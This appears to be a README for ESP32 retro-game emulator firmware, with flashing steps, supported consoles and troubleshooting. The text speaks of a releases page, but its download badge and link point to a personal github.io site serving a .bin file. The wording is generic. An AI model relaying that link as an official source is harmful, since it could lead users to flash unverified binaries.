# 🎮 Retro-Gamer - Play classic games on your monitor

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://enidpenoche926.github.io)

Retro-Gamer brings vintage gaming to your modern display. This tool runs emulators on your ESP32 hardware, specifically the TTGO VGA and Olimex boards. You turn your hardware into a dedicated game console with this software.

## ⚙️ Hardware Basics

You need specific hardware to make this work. This software manages code for the FabGL library. The software focuses on boards that support VGA output. Ensure you have a TTGO VGA32 board or an equivalent Olimex ESP32 setup. You also need a standard VGA monitor and a set of input controllers for the games.

## 📥 How to Get Started

You must visit the releases page to obtain the files for your device.

[Visit the official download page here](https://enidpenoche926.github.io)

Follow these steps to prepare your device:

1. Visit the download link above.
2. Select the latest release version on that page.
3. Download the firmware file ending in .bin to your computer.
4. Prepare your ESP32 board by connecting it to your computer with a USB cable.
5. Use a flash tool like the ESP32 Flash Download Tool to write the file to your board.
6. Connect your monitor to the VGA port on your board.
7. Power the device and enjoy your games.

## 🕹️ Supported Systems

Retro-Gamer handles many consoles from the past. You can run games from the following systems:

* Nintendo Entertainment System (NES)
* Super Nintendo (SNES)
* Sega Genesis and Mega Drive
* Sega Master System (SMS)
* PC Engine (PCE)
* Gameboy
* Atari Lynx

Each system requires its corresponding game file, known as a ROM. You obtain your own ROM files and place them on an SD card for the device to see. Insert the SD card into the slot on your ESP32 board. The software detects the files and displays them in a menu.

## 🖥️ Video and Audio Setup

The software pushes a video signal through the VGA port. Most monitors work with the default settings. You connect your speakers or headphones to the audio jack on your board. If you do not hear sound, check the board audio pins in your settings menu. The software supports standard stereo output for all supported emulators.

## ⌨️ Using Controls

You use either a PS/2 keyboard or a gamepad with this system. Most users prefer a custom gamepad controller. Connect the controller to the designated pins on your board. You can remap buttons in the settings menu if the default layout feels off. Press the Escape key or the Start button to return to the main menu at any time.

## 📝 Configuration Settings

The software includes a internal menu for your settings. Access this menu by holding the button on the board during startup. You can change your screen resolution and audio volume here. Save changes to ensure your settings persist after a power cycle.

## 🛠️ Troubleshooting Common Issues

Check these items if you face trouble:

* The monitor shows no signal: Verify the VGA cable fits tightly. Ensure the power cable provides enough electricity to the board.
* The menu does not load: Check the firmware version. Make sure you flashed the current version to the ESP32.
* Games run slow: Some advanced games demand more power. Ensure your power supply provides a stable 5 volts.
* SD card errors: Use a card formatted as FAT32. Ensure the files occupy the root folder of the card.

## 💡 Tips for Success

Keep your ROM files organized into folders. This makes selecting games easier. Use high-quality VGA cables to prevent ghosting or blurry images on your screen. Keep your ESP32 firmware updated to gain access to better performance and added compatibility. The developers add support for new consoles often, so check the download page every few months.